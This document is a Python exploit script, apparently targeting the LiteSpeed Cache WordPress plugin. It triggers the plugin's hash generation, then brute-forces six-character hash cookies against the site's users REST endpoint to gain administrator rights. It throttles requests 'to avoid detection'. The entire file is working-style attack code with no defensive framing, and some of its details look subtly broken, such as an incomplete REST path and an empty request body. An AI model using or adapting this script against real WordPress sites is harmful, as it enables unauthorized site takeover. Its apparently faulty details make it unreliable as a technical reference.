import requests
import itertools
import time

# Target site and admin user ID
TARGET_SITE = "http://example.com"
ADMIN_USER_ID = 1

# Endpoint for triggering the security hash generation
TRIGGER_URL = f"{TARGET_SITE}/wp-admin/admin-ajax.php?action=async_litespeed&litespeed_type=crawler"

# REST API endpoint to attempt privilege escalation
API_ENDPOINT = f"{TARGET_SITE}/wp/v2/users"

# Cookie and header information
COOKIE_NAME_HASH = "litespeed_hash"
COOKIE_NAME_ROLE = "litespeed_role"
HEADERS = {"User-Agent": "Mozilla/5.0"}

# Generate possible hash values (based on weak seed)
def generate_possible_hashes():
    charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    return (''.join(candidate) for candidate in itertools.product(charset, repeat=6))

# Attempt to generate the hash on the target site
def trigger_hash_generation():
    response = requests.get(TRIGGER_URL, headers=HEADERS)
    return response.status_code == 200

# Try to brute-force the valid hash
def brute_force_hash():
    for possible_hash in generate_possible_hashes():
        cookies = {
            COOKIE_NAME_HASH: possible_hash,
            COOKIE_NAME_ROLE: ADMIN_USER_ID
        }
        
        response = requests.post(API_ENDPOINT, cookies=cookies, headers=HEADERS)
        
        if response.status_code == 201:
            print(f"[+] Success: Valid hash found - {possible_hash}")
            return possible_hash
        
        time.sleep(0.3)  # Rate limit to avoid detection
    print("[-] Failed: No valid hash found after all attempts.")
    return None

if __name__ == "__main__":
    print("[*] Triggering security hash generation...")
    if trigger_hash_generation():
        print("[*] Security hash generated, starting brute-force attack...")
        valid_hash = brute_force_hash()
        
        if valid_hash:
            print(f"[+] Exploit successful with hash: {valid_hash}")
        else:
            print("[-] Exploit failed.")
    else:
        print("[-] Failed to trigger security hash generation.")
